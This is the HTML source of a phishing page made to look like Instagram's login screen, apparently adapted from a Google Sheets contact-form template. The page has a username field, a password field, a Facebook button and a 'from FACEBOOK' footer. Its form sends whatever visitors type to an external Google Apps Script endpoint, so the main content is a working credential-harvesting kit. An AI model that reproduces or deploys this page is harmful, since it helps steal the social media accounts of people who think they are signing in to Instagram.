<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="contact form example">
  <link rel="icon" href="insta.png">
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Overpass:wght@800&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@500&display=swap" rel="stylesheet">
  <script defer src="https://use.fontawesome.com/releases/v5.0.7/js/all.js"></script>

  <title>Instagram</title>
</head>

<body>

  <!-- START HERE -->

  <link rel="stylesheet" href="style.css">

  <form class="gform pure-form pure-form-stacked" method="POST" data-email="example@email.net" action="https://script.google.com/macros/s/AKfycbycuKYXX740HYGh73ej6G5xKg5S7paDqE2J3rINPCJLr1Y3S05E/exec">
    <!-- change the form action to your script url -->

    <div class="form-elements">
      <div id="wrapper">
        <div class="container">
          <!-- <div class="phone-app-demo"></div> -->
          <div class="form-data">
            <div class="new-form">
              <div class="logo">
                <img class="image-logo" src="logo.jpeg" alt="">

              </div>
              <button class="form-btn"><a href="#" class="facebook-login">
                  <span style="font-size:1.8rem;"><i class="fab fa-facebook" style="margin-right:8px;"></i></span> Continue with Facebook
                </a></button>

              <span class="has-separator"><strong>OR</strong></span>
              <input type="text" id="name" name="name" placeholder="Phone number, username, or email">
              <input type="text" id="message" name="message" placeholder="Password">
              <a class="password-reset" href="#">Forgot password?</a>
              <button class="form-btn">Log in</button>
              <div class="sign-up">
                Don't an account? <a href="#"><strong>Sign up</strong></a>
              </div>



            </div>
            <!-- <div class="sign-up">
                    Don't an account? <a href="#">Sign up</a>
                </div> -->

            <div class="get-the-app">
              <hr>
              <span class="face-style">from <br>FACEBOOK</span>
              <div class="badge">
                </div>
            </div>
          </div>
        </div>


      </div>
    </div>

    <!-- Customise the Thankyou Message People See when they submit the form: -->

    <div class="thankyou_message" style="display:none;">
      <h2><em>Thanks</em> for contacting us!
        We will get back to you soon!</h2>
    </div>

  </form>

  <!-- Submit the Form to Google Using "AJAX" -->
  <script data-cfasync="false" type="text/javascript" src="form-submission-handler.js"></script>
  <!-- END -->

</body>

</html>
